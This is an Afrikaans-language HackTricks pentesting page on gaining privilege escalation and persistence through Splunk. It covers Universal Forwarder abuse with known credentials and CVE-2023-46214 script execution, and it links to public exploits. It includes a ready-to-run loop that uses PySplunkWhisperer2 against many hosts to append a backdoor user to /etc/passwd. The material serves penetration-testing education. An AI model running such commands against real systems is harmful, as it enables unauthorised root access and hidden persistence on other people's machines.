# Splunk LPE en Volharding

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

As jy 'n masjien **intern** of **ekstern ondersoek** en jy vind **Splunk wat loop** (poort 8090), as jy gelukkig enige **geldige geloofsbriewe** ken, kan jy die Splunk-diens misbruik om 'n skul te **uitvoer** as die gebruiker wat Splunk laat loop. As root dit laat loop, kan jy voorregte na root eskaleer.

As jy reeds root is en die Splunk-diens nie net op die localhost luister nie, kan jy die wagwoordlêer **van** die Splunk-diens **steel** en die wagwoorde **kraak**, of **nuwe** geloofsbriewe daaraan toevoeg. En volharding op die gasheer handhaaf.

In die eerste prentjie hieronder kan jy sien hoe 'n Splunkd-webblad lyk.



## Splunk Universal Forwarder Agent Exploit Opsomming

Vir verdere besonderhede, kyk na die pos [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Hierdie is net 'n opsomming:

**Exploit-oorsig:**
'n Exploit wat die Splunk Universal Forwarder Agent (UF) teiken, maak dit vir aanvallers met die agentwagwoord moontlik om arbitrêre kode op stelsels wat die agent laat loop, uit te voer, wat potensieel 'n hele netwerk kan benadeel.

**Kernpunte:**
- Die UF-agent valideer nie inkomende verbindings of die egtheid van kode nie, wat dit vatbaar maak vir ongemagtigde kode-uitvoering.
- Gewone metodes vir die verkryging van wagwoorde sluit in die vind daarvan in netwerkgidslys, lêerdeling of interne dokumentasie.
- Suksesvolle uitbuiting kan lei tot toegang op die vlak van SYSTEM of root op gekompromitteerde gasheer, data-uitvoer en verdere netwerkinfiltrasie.

**Uitbuiting van Exploit:**
1. Aanvaller verkry die UF-agentwagwoord.
2. Maak gebruik van die Splunk API om opdragte of skripte na die agente te stuur.
3. Moontlike aksies sluit lêeronttrekking, manipulasie van gebruikersrekeninge en stelselkompromittering in.

**Impak:**
- Volledige netwerkbenadeling met SYSTEM/root-vlak-toestemmings op elke gasheer.
- Moontlikheid om logboekinskrywings te deaktiveer om opsporing te ontduik.
- Installasie van agterdeure of losprysware.

**Voorbeeldopdrag vir Uitbuiting:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Bruikbare openbare exploits:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Misbruik van Splunk-aanvragen

**Vir verdere besonderhede, kyk na die pos [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

Die **CVE-2023-46214** het dit moontlik gemaak om 'n willekeurige skripsie na **`$SPLUNK_HOME/bin/scripts`** te laai en het toe verduidelik dat dit moontlik was om die skripsie wat daar gestoor is, uit te voer deur die soekvraag **`|runshellscript script_name.sh`** te gebruik.


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
